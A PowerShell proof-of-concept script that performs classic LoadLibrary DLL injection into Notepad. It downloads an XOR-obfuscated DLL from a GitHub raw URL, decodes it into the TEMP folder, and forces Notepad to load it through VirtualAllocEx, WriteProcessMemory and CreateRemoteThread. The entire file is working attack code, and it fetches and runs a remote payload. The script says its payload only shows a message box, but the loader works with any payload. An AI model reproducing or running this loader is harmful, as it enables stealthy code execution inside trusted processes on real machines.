<#
LoadLibrary Injection POC
— Targets Notepad
— Downloads an XOR’d DLL directly via raw.githubusercontent.com
— Drops it to disk and calls LoadLibraryA remotely in Notepad
#>

#Requires -Version 3.0

### CONFIGURATION ###
$XOR_KEY   = 0x71
$DLL_URL   = "https://raw.githubusercontent.com/Alon1123/Projects/main/stealth.enc"
$DLL_PATH  = "$env:TEMP\stealth.dll"

### WIN32 IMPORTS ###
$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out IntPtr written);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr threadId);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
}
"@
Add-Type -TypeDefinition $win32 -Language CSharp

function Get-NotepadPID {
    try {
        return (Get-Process -Name notepad -ErrorAction Stop | Select-Object -First 1).Id
    } catch {
        Write-Host "[~] Notepad not running; launching..."
        $p = Start-Process notepad -PassThru
        Start-Sleep -Milliseconds 500
        return $p.Id
    }
}

try {
    # 1) Download & decrypt the DLL directly from raw.githubusercontent.com
    Write-Host "[~] Downloading encrypted DLL from $DLL_URL..."
    $enc = (Invoke-WebRequest -Uri $DLL_URL -UseBasicParsing).Content
    $buf = [byte[]]::new($enc.Length)
    for ($i = 0; $i -lt $enc.Length; $i++) {
        $buf[$i] = $enc[$i] -bxor $XOR_KEY
    }

    # 2) Write decrypted DLL to disk
    Write-Host "[~] Writing decrypted DLL to $DLL_PATH"
    [IO.File]::WriteAllBytes($DLL_PATH, $buf)

    # 3) Get Notepad PID & open process handle
    $targetPID = Get-NotepadPID
    Write-Host "[+] Target Notepad PID: $targetPID"
    $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $targetPID)
    if ($hProc -eq [IntPtr]::Zero) {
        throw "OpenProcess failed (insufficient rights?)"
    }

    try {
        # 4) Allocate memory for the DLL path string
        $pathBytes = [Text.Encoding]::ASCII.GetBytes($DLL_PATH + "`0")
        $len       = $pathBytes.Length
        Write-Host "[~] Allocating $len bytes for path string..."
        $remoteStr = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, $len, 0x3000, 0x04)
        if ($remoteStr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed" }

        # 5) Write the path string into target memory
        Write-Host "[~] Writing path string..."
        $written = [IntPtr]::Zero
        $ok = [Win32]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, $len, [ref]$written)
        if (-not $ok -or $written -ne $len) {
            throw "WriteProcessMemory failed"
        }

        # 6) Lookup LoadLibraryA address
        $hKernel = [Win32]::GetModuleHandle("kernel32.dll")
        $addrLL  = [Win32]::GetProcAddress($hKernel, "LoadLibraryA")
        # Build the formatted string first
        $addrText = ("[+] LoadLibraryA @ 0x{0:X}" -f $addrLL.ToInt64())
        Write-Host $addrText

        # 7) Spawn the remote thread
        Write-Host "[~] Creating remote thread..."
        $tid = [IntPtr]::Zero
        $hth = [Win32]::CreateRemoteThread(
            $hProc, [IntPtr]::Zero, 0, $addrLL, $remoteStr, 0, [ref]$tid
        )
        if ($hth -eq [IntPtr]::Zero) {
            throw "CreateRemoteThread failed"
        }
        Write-Host "[+] Injection succeeded! Thread ID: $tid"
        [Win32]::CloseHandle($hth) | Out-Null

    } finally {
        [Win32]::CloseHandle($hProc) | Out-Null
    }

    Write-Host "[✓] Done — check Notepad for the MessageBox."
}
catch {
    Write-Error "[!] Error: $_"
    exit 1
}
